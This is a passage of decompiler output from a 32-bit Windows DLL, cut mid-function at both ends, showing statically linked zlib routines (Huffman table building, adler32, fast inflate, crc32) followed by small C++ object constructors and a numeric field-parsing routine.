    v16 = *(__int16 *)((char *)v36 + k) + *(__int16 *)((char *)v35 + k);
    v17 = k + 1;
    *(__int16 *)((char *)v35 + v17 + 1) = v16;
  }
  for ( m = 0; m < a4; ++m )
  {
    v19 = (_WORD *)(a3 + 2 * m);
    v20 = *v19 == 0;
    v39 = (int)v19;
    if ( !v20 )
    {
      a6[(unsigned __int16)v35[(unsigned __int16)*v19]] = m;
      ++v35[*(unsigned __int16 *)v39];
    }
  }
  if ( a2 )
  {
    if ( a2 == 1 )
    {
      v43 = (char *)&unk_101018F8 - 514;
      v44 = (char *)&unk_10101938 - 514;
      v49 = 256;
    }
    else
    {
      v49 = -1;
      v43 = (char *)&unk_10101978;
      v44 = &unk_101019B8;
    }
  }
  else
  {
    v44 = a6;
    v43 = (char *)a6;
    v49 = 19;
  }
  v42 = -1;
  v21 = *a1;
  v22 = j;
  v46 = 0;
  v40 = j;
  v52 = 0;
  v41 = 1 << v51;
  v45 = 1 << v51;
  v39 = (1 << v51) - 1;
  if ( a2 == 1 && (unsigned int)(1 << v51) >= 0x5B0 )
    return 1;
  v50 = a6;
  while ( 1 )
  {
    BYTE1(v53) = v22 - v52;
    if ( (unsigned __int16)*v50 >= v49 )
    {
      if ( (unsigned __int16)*v50 <= v49 )
      {
        HIWORD(v53) = 0;
        LOBYTE(v53) = 96;
      }
      else
      {
        v23 = 2 * (unsigned __int16)*v50;
        LOBYTE(v53) = v44[v23];
        HIWORD(v53) = *(_WORD *)&v43[v23];
      }
    }
    else
    {
      LOBYTE(v53) = 0;
      HIWORD(v53) = *v50;
    }
    v24 = 1 << (v22 - v52);
    v48 = v41;
    v38 = v41;
    v25 = &v21[v41 + (v14 >> v52)];
    do
    {
      v48 -= v24;
      v25 -= v24;
      v20 = v48 == 0;
      *v25 = v53;
    }
    while ( !v20 );
    for ( n = 1 << (v22 - 1); (n & v46) != 0; n >>= 1 )
      ;
    if ( n )
      v14 = n + (v46 & (n - 1));
    else
      v14 = 0;
    ++v50;
    v27 = &v36[v22];
    LOWORD(v27) = --*v27;
    v46 = v14;
    if ( (_WORD)v27 )
      goto LABEL_53;
    if ( v22 == v47 )
      break;
    v22 = *(unsigned __int16 *)(a3 + 2 * (unsigned __int16)*v50);
    v40 = v22;
LABEL_53:
    if ( v22 > v51 )
    {
      v37 = v14 & v39;
      if ( (v14 & v39) != v42 )
      {
        if ( !v52 )
          v52 = v51;
        v21 += v38;
        v28 = v22 - v52;
        v29 = 1 << (v22 - v52);
        if ( v22 < v47 )
        {
          v48 = v22;
          for ( ii = &v36[v22]; ; ii = (__int16 *)v38 )
          {
            v31 = v29 - (unsigned __int16)*ii;
            if ( v31 <= 0 )
              break;
            ++v28;
            ++v48;
            v38 = (signed int)(ii + 1);
            v29 = 2 * v31;
            if ( v48 >= v47 )
              break;
          }
        }
        result = 1;
        v45 += 1 << v28;
        v41 = 1 << v28;
        if ( a2 == 1 && v45 >= 0x5B0 )
          return result;
        v14 = v46;
        v42 = v37;
        v32 = v37;
        LOBYTE((*a1)[v32]) = v28;
        BYTE1((*a1)[v32]) = v51;
        HIWORD((*a1)[v32]) = v21 - *a1;
        v22 = v40;
      }
    }
  }
  HIWORD(v54) = 0;
  LOBYTE(v54) = 64;
  BYTE1(v54) = v22 - v52;
  while ( v14 )
  {
    if ( v52 && (v14 & v39) != v42 )
    {
      LOBYTE(v22) = v51;
      v52 = 0;
      v21 = *a1;
      BYTE1(v54) = v51;
    }
    v21[v14 >> v52] = v54;
    for ( jj = 1 << (v22 - 1); (jj & v14) != 0; jj >>= 1 )
      ;
    if ( jj )
      v14 = jj + (v14 & (jj - 1));
    else
      v14 = 0;
  }
  v34 = v51;
  *a1 += v45;
  *a5 = v34;
  return 0;
}
// 10027B8E: using guessed type __int16 var_60[16];

//----- (10027F38) --------------------------------------------------------
void *__cdecl sub_10027F38(int a1, int a2, int a3)
{
  return malloc(a3 * a2);
}

//----- (10027F4B) --------------------------------------------------------
void __cdecl sub_10027F4B(int a1, void *Block)
{
  free(Block);
}

//----- (10027F59) --------------------------------------------------------
int __usercall sub_10027F59@<eax>(unsigned int a1@<eax>, unsigned __int8 *a2@<ecx>, unsigned int a3)
{
  unsigned int v3; // ebx
  int result; // eax
  unsigned int v5; // edi
  int v7; // eax
  unsigned int v8; // esi
  unsigned int v9; // edi
  unsigned int v10; // esi
  unsigned int v11; // edi
  unsigned int v12; // esi
  unsigned int v13; // edi
  unsigned int v14; // esi
  unsigned int v15; // edi
  unsigned int v16; // esi
  unsigned int v17; // edi
  unsigned int v18; // esi
  unsigned int v19; // edi
  unsigned int v20; // esi
  unsigned int v21; // edi
  unsigned int v22; // esi
  unsigned int v23; // edi
  unsigned int v24; // esi
  int v25; // edi
  int v26; // esi
  int v27; // edi
  int v28; // esi
  int v29; // edi
  int v30; // esi
  int v31; // edi
  int v32; // esi
  int v33; // edi
  int v34; // esi
  int v35; // edi
  int v36; // esi
  int v37; // edi
  bool v38; // zf
  unsigned int v39; // eax
  unsigned int v40; // esi
  unsigned int v41; // edi
  unsigned int v42; // esi
  unsigned int v43; // edi
  unsigned int v44; // esi
  unsigned int v45; // edi
  unsigned int v46; // esi
  unsigned int v47; // edi
  unsigned int v48; // esi
  unsigned int v49; // edi
  unsigned int v50; // esi
  unsigned int v51; // edi
  unsigned int v52; // esi
  unsigned int v53; // edi
  unsigned int v54; // esi
  unsigned int v55; // edi
  unsigned int v56; // esi
  int v57; // edi
  int v58; // esi
  int v59; // edi
  int v60; // esi
  int v61; // edi
  int v62; // esi
  int v63; // edi
  int v64; // esi
  int v65; // edi
  int v66; // esi
  int v67; // edi
  int v68; // esi
  int v69; // edi
  unsigned int v70; // eax
  unsigned int v71; // [esp+Ch] [ebp-4h]

  v3 = a3;
  result = 1;
  v5 = HIWORD(a1);
  a1 = (unsigned __int16)a1;
  if ( a3 == 1 )
  {
    a1 = *a2 + (unsigned __int16)a1;
    if ( a1 >= 0xFFF1 )
      a1 -= 65521;
    v5 += a1;
    if ( v5 >= 0xFFF1 )
      v5 -= 65521;
  }
  else
  {
    if ( !a2 )
      return result;
    if ( a3 < 0x10 )
    {
      while ( v3 )
      {
        --v3;
        a1 += *a2++;
        v5 += a1;
      }
      if ( a1 >= 0xFFF1 )
        a1 -= 65521;
      v70 = v5 % 0xFFF1;
      return a1 | (v70 << 16);
    }
    if ( a3 >= 0x15B0 )
    {
      v3 = a3;
      v71 = a3 / 0x15B0;
      do
      {
        v3 -= 5552;
        v7 = 347;
        do
        {
          v8 = *a2 + a1;
          v9 = v8 + v5;
          v10 = a2[1] + v8;
          v11 = v10 + v9;
          v12 = a2[2] + v10;
          v13 = v12 + v11;
          v14 = a2[3] + v12;
          v15 = v14 + v13;
          v16 = a2[4] + v14;
          v17 = v16 + v15;
          v18 = a2[5] + v16;
          v19 = v18 + v17;
          v20 = a2[6] + v18;
          v21 = v20 + v19;
          v22 = a2[7] + v20;
          v23 = v22 + v21;
          v24 = a2[8] + v22;
          v25 = v24 + v23;
          v26 = a2[9] + v24;
          v27 = v26 + v25;
          v28 = a2[10] + v26;
          v29 = v28 + v27;
          v30 = a2[11] + v28;
          v31 = v30 + v29;
          v32 = a2[12] + v30;
          v33 = v32 + v31;
          v34 = a2[13] + v32;
          v35 = v34 + v33;
          v36 = a2[14] + v34;
          v37 = v36 + v35;
          a1 = a2[15] + v36;
          v5 = a1 + v37;
          a2 += 16;
          --v7;
        }
        while ( v7 );
        a1 %= 0xFFF1u;
        v38 = v71-- == 1;
        v5 %= 0xFFF1u;
      }
      while ( !v38 );
    }
    if ( v3 )
    {
      if ( v3 >= 0x10 )
      {
        v39 = v3 >> 4;
        do
        {
          v40 = *a2 + a1;
          v41 = v40 + v5;
          v42 = a2[1] + v40;
          v43 = v42 + v41;
          v44 = a2[2] + v42;
          v45 = v44 + v43;
          v46 = a2[3] + v44;
          v47 = v46 + v45;
          v48 = a2[4] + v46;
          v49 = v48 + v47;
          v50 = a2[5] + v48;
          v51 = v50 + v49;
          v52 = a2[6] + v50;
          v53 = v52 + v51;
          v54 = a2[7] + v52;
          v55 = v54 + v53;
          v56 = a2[8] + v54;
          v57 = v56 + v55;
          v58 = a2[9] + v56;
          v59 = v58 + v57;
          v60 = a2[10] + v58;
          v61 = v60 + v59;
          v62 = a2[11] + v60;
          v63 = v62 + v61;
          v64 = a2[12] + v62;
          v65 = v64 + v63;
          v66 = a2[13] + v64;
          v67 = v66 + v65;
          v68 = a2[14] + v66;
          v69 = v68 + v67;
          a1 = a2[15] + v68;
          v3 -= 16;
          v5 = a1 + v69;
          a2 += 16;
          --v39;
        }
        while ( v39 );
      }
      while ( v3 )
      {
        --v3;
        a1 += *a2++;
        v5 += a1;
      }
      a1 %= 0xFFF1u;
      v5 %= 0xFFF1u;
    }
  }
  v70 = v5;
  return a1 | (v70 << 16);
}
// 10027F59: too many cbuild loops

//----- (10028173) --------------------------------------------------------
unsigned int __cdecl sub_10028173(_DWORD *a1, int a2)
{
  _DWORD *v2; // eax
  int v3; // edx
  unsigned __int8 *v4; // ebx
  _DWORD *v5; // esi
  _BYTE *v6; // edi
  unsigned __int8 *v7; // ebx
  int v8; // edx
  unsigned int v9; // edx
  int v10; // edx
  unsigned __int8 *v11; // ebx
  int v12; // edx
  unsigned int i; // ecx
  unsigned int v14; // edx
  int v15; // ecx
  unsigned int v16; // ecx
  char v17; // cl
  int v18; // edx
  int v19; // edx
  unsigned int v20; // edx
  _BYTE *v21; // ecx
  bool v22; // zf
  unsigned int v23; // ecx
  _BYTE *v24; // ecx
  _BYTE *v25; // ecx
  _BYTE *v26; // ecx
  unsigned int v27; // eax
  char *v28; // ecx
  _BYTE *v29; // edi
  char v30; // dl
  char *v31; // ecx
  _BYTE *v32; // edi
  char v33; // dl
  _BYTE *v34; // ecx
  unsigned __int8 *v35; // ebx
  unsigned int result; // eax
  unsigned int v37; // [esp+Ch] [ebp-40h]
  _BYTE *v38; // [esp+10h] [ebp-3Ch]
  int v39; // [esp+14h] [ebp-38h]
  int v40; // [esp+18h] [ebp-34h]
  unsigned int v41; // [esp+1Ch] [ebp-30h]
  unsigned int v42; // [esp+20h] [ebp-2Ch]
  int v43; // [esp+24h] [ebp-28h]
  int v44; // [esp+28h] [ebp-24h]
  int v45; // [esp+2Ch] [ebp-20h]
  int v46; // [esp+30h] [ebp-1Ch]
  unsigned int v47; // [esp+34h] [ebp-18h]
  unsigned int v48; // [esp+38h] [ebp-14h]
  unsigned int v49; // [esp+38h] [ebp-14h]
  unsigned int v50; // [esp+3Ch] [ebp-10h]
  int v51; // [esp+3Ch] [ebp-10h]
  _BYTE *v52; // [esp+3Ch] [ebp-10h]
  unsigned __int16 v53; // [esp+3Eh] [ebp-Eh]
  unsigned int v54; // [esp+40h] [ebp-Ch]
  char v55; // [esp+44h] [ebp-8h]
  unsigned int v56; // [esp+44h] [ebp-8h]
  unsigned int v57; // [esp+44h] [ebp-8h]
  unsigned int v58; // [esp+44h] [ebp-8h]
  unsigned int v59; // [esp+44h] [ebp-8h]
  unsigned int v60; // [esp+48h] [ebp-4h]
  unsigned int v61; // [esp+58h] [ebp+Ch]

  v2 = a1;
  v3 = a1[4];
  v4 = (unsigned __int8 *)(*a1 - 1);
  v42 = (unsigned int)&v4[a1[1] - 5];
  v5 = (_DWORD *)a1[7];
  v6 = (_BYTE *)(a1[3] - 1);
  v38 = &v6[v3 - a2];
  v41 = (unsigned int)&v6[v3 - 257];
  v44 = v5[10];
  v37 = v5[11];
  v47 = v5[12];
  v43 = v5[13];
  v60 = v5[14];
  v61 = v5[15];
  v46 = v5[19];
  v45 = v5[20];
  v40 = (1 << v5[21]) - 1;
  v39 = (1 << v5[22]) - 1;
  do
  {
    if ( v61 < 0xF )
    {
      v7 = v4 + 1;
      v8 = *v7 << v61;
      v4 = v7 + 1;
      v60 += (*v4 << (v61 + 8)) + v8;
      v61 += 16;
    }
    v50 = *(_DWORD *)(v46 + 4 * (v60 & v40));
    v9 = v50;
    v60 >>= SBYTE1(v50);
    v61 -= BYTE1(v50);
    v55 = v50;
    if ( (_BYTE)v50 )
    {
      while ( (v55 & 0x10) == 0 )
      {
        if ( (v55 & 0x40) != 0 )
        {
          if ( (v55 & 0x20) != 0 )
          {
            *v5 = 11;
          }
          else
          {
            v2[6] = aInvalidLiteral_1;
LABEL_59:
            *v5 = 27;
          }
          goto LABEL_60;
        }
        v50 = *(_DWORD *)(v46 + 4 * (HIWORD(v50) + (v60 & ((1 << v55) - 1))));
        v9 = v50;
        v60 >>= SBYTE1(v50);
        v61 -= BYTE1(v50);
        v55 = v50;
        if ( !(_BYTE)v50 )
          goto LABEL_8;
      }
      v54 = HIWORD(v9);
      v56 = v55 & 0xF;
      if ( v56 )
      {
        if ( v61 < v56 )
        {
          v60 += *++v4 << v61;
          v61 += 8;
        }
        v10 = v60 & ((1 << v56) - 1);
        v60 >>= v56;
        v54 += v10;
        v61 -= v56;
      }
      if ( v61 < 0xF )
      {
        v11 = v4 + 1;
        v12 = *v11 << v61;
        v4 = v11 + 1;
        v60 += (*v4 << (v61 + 8)) + v12;
        v61 += 16;
      }
      for ( i = *(_DWORD *)(v45 + 4 * (v60 & v39)); ; i = *(_DWORD *)(v45 + 4 * (v53 + (v60 & ((1 << v14) - 1)))) )
      {
        v53 = HIWORD(i);
        v14 = i;
        v15 = BYTE1(i);
        v60 >>= v15;
        v61 -= v15;
        if ( (v14 & 0x10) != 0 )
          break;
        if ( (v14 & 0x40) != 0 )
        {
          v2[6] = aInvalidDistanc_3;
          goto LABEL_59;
        }
      }
      v16 = v14 & 0xF;
      v48 = HIWORD(v14);
      v57 = v16;
      if ( v61 < v16 )
      {
        v17 = v61;
        v61 += 8;
        v18 = *++v4 << v17;
        LOBYTE(v16) = v57;
        v60 += v18;
        if ( v61 < v57 )
        {
          ++v4;
          LOBYTE(v16) = v57;
          v60 += *v4 << v61;
          v61 += 8;
        }
      }
      v61 -= v57;
      v19 = v60 & ((1 << v16) - 1);
      v60 >>= v57;
      v49 = v19 + v48;
      if ( v49 <= v6 - v38 )
      {
        v25 = &v6[-v49];
        do
        {
          v54 -= 3;
          v31 = v25 + 1;
          v32 = v6 + 1;
          *v32 = *v31++;
          v33 = *v31;
          ++v32;
          v25 = v31 + 1;
          *v32 = v33;
          v6 = v32 + 1;
          *v6 = *v25;
        }
        while ( v54 > 2 );
LABEL_48:
        if ( v54 )
        {
          v34 = v25 + 1;
          *++v6 = *v34;
          if ( v54 > 1 )
            *++v6 = v34[1];
        }
        continue;
      }
      v20 = v49 - (v6 - v38);
      v58 = v20;
      if ( v20 > v37 )
      {
        v2[6] = aInvalidDistanc_2;
        goto LABEL_59;
      }
      v51 = v43 - 1;
      if ( v47 )
      {
        if ( v47 >= v20 )
        {
          v52 = (_BYTE *)(v47 - v20 + v51);
          if ( v20 < v54 )
          {
            v54 -= v20;
            v26 = v52;
            do
            {
              ++v26;
              ++v6;
              v22 = v58-- == 1;
              *v6 = *v26;
            }
            while ( !v22 );
            goto LABEL_36;
          }
        }
        else
        {
          v52 = (_BYTE *)(v44 + v47 - v20 + v51);
          v23 = v20 - v47;
          if ( v20 - v47 < v54 )
          {
            v54 -= v23;
            do
            {
              ++v52;
              ++v6;
              --v23;
              *v6 = *v52;
            }
            while ( v23 );
            v52 = (_BYTE *)(v43 - 1);
            if ( v47 < v54 )
            {
              v54 -= v47;
              v59 = v47;
              v24 = (_BYTE *)(v43 - 1);
              do
              {
                ++v24;
                ++v6;
                v22 = v59-- == 1;
                *v6 = *v24;
              }
              while ( !v22 );
              goto LABEL_36;
            }
          }
        }
      }
      else
      {
        v52 = (_BYTE *)(v44 - v20 + v51);
        if ( v20 < v54 )
        {
          v54 -= v20;
          v21 = v52;
          do
          {
            ++v21;
            ++v6;
            v22 = v58-- == 1;
            *v6 = *v21;
          }
          while ( !v22 );
LABEL_36:
          v25 = &v6[-v49];
          v52 = &v6[-v49];
          goto LABEL_42;
        }
      }
      v25 = v52;
LABEL_42:
      if ( v54 > 2 )
      {
        v25 = v52;
        v27 = (v54 - 3) / 3 + 1;
        do
        {
          v54 -= 3;
          v28 = v25 + 1;
          v29 = v6 + 1;
          *v29 = *v28++;
          v30 = *v28;
          ++v29;
          v25 = v28 + 1;
          *v29 = v30;
          v6 = v29 + 1;
          --v27;
          *v6 = *v25;
        }
        while ( v27 );
        v2 = a1;
      }
      goto LABEL_48;
    }
LABEL_8:
    *++v6 = BYTE2(v9);
  }
  while ( (unsigned int)v4 < v42 && (unsigned int)v6 < v41 );
LABEL_60:
  v35 = &v4[-(v61 >> 3)];
  *v2 = v35 + 1;
  v2[3] = v6 + 1;
  v2[1] = v42 - (_DWORD)v35 + 5;
  v2[4] = v41 - (_DWORD)v6 + 257;
  result = v61 - 8 * (v61 >> 3);
  v5[14] = ((1 << result) - 1) & v60;
  v5[15] = result;
  return result;
}

//----- (1002854F) --------------------------------------------------------
int __usercall sub_1002854F@<eax>(_BYTE *a1@<edx>, int a2, unsigned int a3)
{
  if ( a1 )
    return sub_10028568(a2, a1, a3);
  else
    return 0;
}

//----- (10028568) --------------------------------------------------------
int __usercall sub_10028568@<eax>(int a1@<eax>, _BYTE *a2@<edx>, unsigned int a3)
{
  unsigned int i; // eax
  _DWORD *v4; // esi
  unsigned int v5; // eax
  _DWORD *v6; // esi
  unsigned int v7; // edx
  unsigned int v8; // eax
  unsigned int v9; // edx
  unsigned int v10; // eax
  unsigned int v11; // edx
  unsigned int v12; // eax
  unsigned int v13; // edx
  int v14; // edx
  bool v15; // zf
  unsigned int v17; // [esp+Ch] [ebp-4h]
  unsigned int v18; // [esp+Ch] [ebp-4h]

  for ( i = ~a1; a3; --a3 )
  {
    if ( ((unsigned __int8)a2 & 3) == 0 )
      break;
    i = dword_100FF8A0[(unsigned __int8)(i ^ *a2++)] ^ (i >> 8);
  }
  v4 = a2;
  if ( a3 >= 0x20 )
  {
    v17 = a3 >> 5;
    do
    {
      v5 = *v4 ^ i;
      v6 = v4 + 1;
      v7 = *v6++ ^ dword_101004A0[(unsigned __int8)v5] ^ dword_100FF8A0[HIBYTE(v5)] ^ dword_101000A0[BYTE1(v5)] ^ dword_100FFCA0[BYTE2(v5)];
      v8 = *v6++ ^ dword_101004A0[(unsigned __int8)v7] ^ dword_100FF8A0[HIBYTE(v7)] ^ dword_101000A0[BYTE1(v7)] ^ dword_100FFCA0[BYTE2(v7)];
      v9 = *v6++ ^ dword_101004A0[(unsigned __int8)v8] ^ dword_100FF8A0[HIBYTE(v8)] ^ dword_101000A0[BYTE1(v8)] ^ dword_100FFCA0[BYTE2(v8)];
      v10 = *v6++ ^ dword_101004A0[(unsigned __int8)v9] ^ dword_100FF8A0[HIBYTE(v9)] ^ dword_101000A0[BYTE1(v9)] ^ dword_100FFCA0[BYTE2(v9)];
      v11 = *v6++ ^ dword_101004A0[(unsigned __int8)v10] ^ dword_100FF8A0[HIBYTE(v10)] ^ dword_101000A0[BYTE1(v10)] ^ dword_100FFCA0[BYTE2(v10)];
      v12 = *v6++ ^ dword_101004A0[(unsigned __int8)v11] ^ dword_100FF8A0[HIBYTE(v11)] ^ dword_101000A0[BYTE1(v11)] ^ dword_100FFCA0[BYTE2(v11)];
      a3 -= 32;
      v13 = *v6 ^ dword_101004A0[(unsigned __int8)v12] ^ dword_100FF8A0[HIBYTE(v12)] ^ dword_101000A0[BYTE1(v12)] ^ dword_100FFCA0[BYTE2(v12)];
      v4 = v6 + 1;
      i = dword_101004A0[(unsigned __int8)v13] ^ dword_100FF8A0[HIBYTE(v13)] ^ dword_101000A0[BYTE1(v13)] ^ dword_100FFCA0[BYTE2(v13)];
      --v17;
    }
    while ( v17 );
  }
  if ( a3 >= 4 )
  {
    v18 = a3 >> 2;
    do
    {
      a3 -= 4;
      v14 = dword_101004A0[(unsigned __int8)(*(_BYTE *)v4 ^ i)] ^ dword_100FF8A0[(*v4 ^ i) >> 24] ^ dword_101000A0[(unsigned __int8)((unsigned __int16)(*(_WORD *)v4 ^ i) >> 8)] ^ dword_100FFCA0[(unsigned __int8)((*v4 ^ i) >> 16)];
      ++v4;
      v15 = v18-- == 1;
      i = v14;
    }
    while ( !v15 );
  }
  for ( ; a3; --a3 )
  {
    i = dword_100FF8A0[(unsigned __int8)(i ^ *(_BYTE *)v4)] ^ (i >> 8);
    v4 = (_DWORD *)((char *)v4 + 1);
  }
  return ~i;
}
// 100FF8A0: using guessed type int dword_100FF8A0[256];
// 100FFCA0: using guessed type int dword_100FFCA0[256];
// 101000A0: using guessed type int dword_101000A0[256];
// 101004A0: using guessed type int dword_101004A0[1280];

//----- (100287B9) --------------------------------------------------------
void __thiscall sub_100287B9(_BYTE *this)
{
  this[9] = 1;
}

//----- (100287DB) --------------------------------------------------------
int __stdcall sub_100287DB(int a1, int a2, volatile LONG *lpAddend)
{
  volatile LONG *v3; // eax
  int v4; // ecx

  *(_DWORD *)(a1 + 4) = -1;
  *(_DWORD *)a1 = &off_10103198;
  *(_BYTE *)(a1 + 8) = 0;
  *(_BYTE *)(a1 + 9) = 1;
  v3 = lpAddend;
  v4 = a2;
  *(_DWORD *)a1 = &off_101031A8;
  *(_DWORD *)(a1 + 16) = v3;
  *(_DWORD *)(a1 + 12) = v4;
  InterlockedIncrement(v3);
  *(_BYTE *)(a1 + 20) = 0;
  sub_1000728E((_DWORD *)(a1 + 24), 0);
  sub_1000780D(&a2);
  return a1;
}
// 10103198: using guessed type int (__thiscall *off_10103198)(void *Block, char);
// 101031A8: using guessed type int (__thiscall *off_101031A8)(void *Block, char);

//----- (10028845) --------------------------------------------------------
void __thiscall sub_10028845(_DWORD *this)
{
  *this = &off_101031A8;
  sub_1000780D(this + 6);
  sub_1000780D(this + 3);
  *this = &off_10103198;
}
// 10103198: using guessed type int (__thiscall *off_10103198)(void *Block, char);
// 101031A8: using guessed type int (__thiscall *off_101031A8)(void *Block, char);

//----- (10028887) --------------------------------------------------------
_DWORD *__thiscall sub_10028887(_DWORD *Block, char a2)
{
  sub_10028845(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100288A3) --------------------------------------------------------
int __stdcall sub_100288A3(int a1)
{
  int result; // eax

  result = a1;
  *(_DWORD *)(a1 + 4) = -1;
  *(_DWORD *)a1 = &off_10103198;
  *(_BYTE *)(a1 + 8) = 0;
  *(_BYTE *)(a1 + 9) = 1;
  *(_DWORD *)(a1 + 12) = off_100FBF5C;
  *(_DWORD *)(a1 + 12) = &off_101031C0;
  *(_DWORD *)(a1 + 16) = 0;
  *(_DWORD *)(a1 + 20) = 0;
  *(_DWORD *)(a1 + 24) = 0;
  return result;
}
// 100FBF5C: using guessed type int (__thiscall *off_100FBF5C[2])(void *Block, char);
// 10103198: using guessed type int (__thiscall *off_10103198)(void *Block, char);
// 101031C0: using guessed type int (__thiscall *off_101031C0)(void *Block, char);

//----- (100288F3) --------------------------------------------------------
void __thiscall sub_100288F3(_DWORD *this)
{
  sub_10029657(this + 3);
  *this = &off_10103198;
}
// 10103198: using guessed type int (__thiscall *off_10103198)(void *Block, char);

//----- (10028920) --------------------------------------------------------
void __thiscall sub_10028920(_DWORD *this, char a2, int a3)
{
  (*(void (__thiscall **)(_DWORD *, char *))(this[3] + 36))(this + 3, &a2);
  sub_1000780D(&a2);
}

//----- (10028950) --------------------------------------------------------
void __thiscall sub_10028950(int this)
{
  _DWORD *v2; // eax
  void *v3[3]; // [esp+Ch] [ebp-18h] BYREF
  int v4; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(int, void **))(*(_DWORD *)(this + 12) + 12))(this + 12, v3);
  v4 = 0;
  while ( !(*(unsigned __int8 (__thiscall **)(void *))(*(_DWORD *)v3[0] + 4))(v3[0]) )
  {
    v2 = (_DWORD *)(*(int (__thiscall **)(void *))(*(_DWORD *)v3[0] + 12))(v3[0]);
    (*(void (__thiscall **)(_DWORD))(*(_DWORD *)*v2 + 8))(*v2);
    sub_10042AAB((int)v3[0]);
  }
  v4 = -1;
  sub_1003406C(v3);
  *(_BYTE *)(this + 9) = 1;
}

//----- (100289DB) --------------------------------------------------------
_DWORD *__stdcall sub_100289DB(_DWORD *a1)
{
  sub_100288A3((int)a1);
  *a1 = &off_10103200;
  return a1;
}
// 10103200: using guessed type int (__thiscall *off_10103200)(void *Block, char);

//----- (10028A08) --------------------------------------------------------
void __thiscall sub_10028A08(_DWORD *this)
{
  *this = &off_10103200;
  sub_100288F3(this);
}
// 10103200: using guessed type int (__thiscall *off_10103200)(void *Block, char);

//----- (10028A2C) --------------------------------------------------------
_DWORD *__thiscall sub_10028A2C(_DWORD *Block, char a2)
{
  sub_10028A08(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10028A48) --------------------------------------------------------
void __cdecl sub_10028A48(int a1)
{
  sub_1000A219(dword_1017DB58, &a1);
  sub_1000780D(&a1);
}
// 1017DB58: using guessed type _DWORD dword_1017DB58[2];

//----- (10028A76) --------------------------------------------------------
_DWORD *__stdcall sub_10028A76(_DWORD *a1)
{
  *a1 = 0;
  sub_10006814(a1 + 1);
  a1[5] = 0;
  sub_10006814(a1 + 6);
  a1[10] = 0;
  sub_1000D17D(a1 + 11, &word_1017DB80);
  sub_1000D17D(a1 + 13, &word_1017DB80);
  return a1;
}

//----- (10028AD3) --------------------------------------------------------
char __cdecl sub_10028AD3(unsigned int *a1, int a2)
{
  int v2; // ebx
  int v3; // eax
  int v4; // eax
  unsigned int v5; // ebx
  _DWORD *v6; // edi
  void (__thiscall **v7)(_DWORD *, int); // esi
  int v8; // eax
  char v9; // bl
  int v11; // eax
  unsigned int v12; // eax
  wchar_t *v13; // ecx
  unsigned int *v14; // esi
  bool v15; // zf
  void (__thiscall **v16)(int, int); // edi
  int v17; // eax
  LONG *v18; // eax
  int v19; // ecx
  int v20; // eax
  signed int v21; // eax
  wchar_t *v22; // ecx
  LONG *v23; // eax
  int v24; // ecx
  int v25; // eax
  signed int v26; // eax
  wchar_t *v27; // ecx
  LONG *v28; // eax
  int v29; // ecx
  int v30; // eax
  LONG *v31; // esi
  int v32; // ecx
  LONG *v33; // esi
  int v34; // ecx
  void (__thiscall **v35)(int, int); // esi
  int v36; // eax
  unsigned int i; // [esp+10h] [ebp-14h]
  wchar_t *EndPtr[3]; // [esp+14h] [ebp-10h] BYREF
  int v39; // [esp+20h] [ebp-4h]

  v39 = 0;
  v2 = a2 + 4;
  if ( !(*(int (__thiscall **)(int))(*(_DWORD *)(a2 + 4) + 4))(a2 + 4) )
  {
    v3 = dword_101842F4;
    *a1 = *(_DWORD *)(dword_101842F4 + 56);
    (*(void (__thiscall **)(unsigned int *, int))(a1[1] + 56))(a1 + 1, v3 + 60);
    v4 = dword_101842F4;
    a1[5] = *(_DWORD *)(dword_101842F4 + 48);
    a1[10] = *(_DWORD *)(v4 + 156);
    sub_10001236((LONG *)(v4 + 44), (LONG *)a1 + 12);
    sub_10001236((LONG *)(dword_101842F4 + 28), (LONG *)a1 + 14);
    v5 = 0;
    if ( (*(int (__thiscall **)(int))(*(_DWORD *)(dword_101842F4 + 227) + 4))(dword_101842F4 + 227) )
    {
      v6 = a1 + 6;
      do
      {
        v7 = (void (__thiscall **)(_DWORD *, int))(*v6 + 36);
        v8 = (*(int (__stdcall **)(unsigned int))(*(_DWORD *)(dword_101842F4 + 227) + 44))(v5);
        (*v7)(v6, v8);
        ++v5;
      }
      while ( v5 < (*(int (__thiscall **)(int))(*(_DWORD *)(dword_101842F4 + 227) + 4))(dword_101842F4 + 227) );
    }
    v9 = 1;
    goto LABEL_6;
  }
  if ( (unsigned int)(*(int (__thiscall **)(int))(*(_DWORD *)v2 + 4))(v2) < 7
    || (unsigned int)(*(int (__thiscall **)(int))(*(_DWORD *)v2 + 4))(v2) > 0x43 )
  {
    sub_10007D7A((void **)&a2);
    return 0;
  }
  EndPtr[0] = 0;
  v11 = (*(int (__thiscall **)(int, int))(*(_DWORD *)v2 + 44))(v2, 1);
  v12 = wcstoul(*(const wchar_t **)(*(_DWORD *)(v11 + 4) + 12), EndPtr, 10);
  v13 = EndPtr[0];
  v14 = a1;
  v15 = EndPtr[0] == 0;
  *a1 = v12;
  if ( v15 || *v13 || v12 > 3 )
    goto LABEL_33;
  (*(void (__thiscall **)(unsigned int *))(a1[1] + 52))(a1 + 1);
  v16 = (void (__thiscall **)(int, int))(a1[1] + 36);
  v17 = (*(int (__thiscall **)(int, int))(*(_DWORD *)v2 + 44))(v2, 2);
  (*v16)((int)(a1 + 1), v17);
  if ( !*a1 )
  {
    v18 = (LONG *)(*(int (__thiscall **)(int, int))(*(_DWORD *)v2 + 44))(v2, 1);
    if ( *(_WORD *)sub_1000D52B(v19, 0, v18) != 48 )
      goto LABEL_33;
    v14 = a1;
  }
  EndPtr[0] = 0;
  v20 = (*(int (__thiscall **)(int, int))(*(_DWORD *)v2 + 44))(v2, 3);
  v21 = wcstoul(*(const wchar_t **)(*(_DWORD *)(v20 + 4) + 12), EndPtr, 10);
  v22 = EndPtr[0];
  v15 = EndPtr[0] == 0;
  v14[5] = v21;
  if ( v15 || *v22 || v21 > 100 )
    goto LABEL_33;
  if ( !v21 )
  {
    v23 = (LONG *)(*(int (__thiscall **)(int, int))(*(_DWORD *)v2 + 44))(v2, 3);
    if ( *(_WORD *)sub_1000D52B(v24, 0, v23) != 48 )
      goto LABEL_33;
    v14 = a1;
  }
  EndPtr[0] = 0;
  v25 = (*(int (__thiscall **)(int, int))(*(_DWORD *)v2 + 44))(v2, 4);
  v26 = wcstoul(*(const wchar_t **)(*(_DWORD *)(v25 + 4) + 12), EndPtr, 10);
  v27 = EndPtr[0];
  v15 = EndPtr[0] == 0;
  v14[10] = v26;
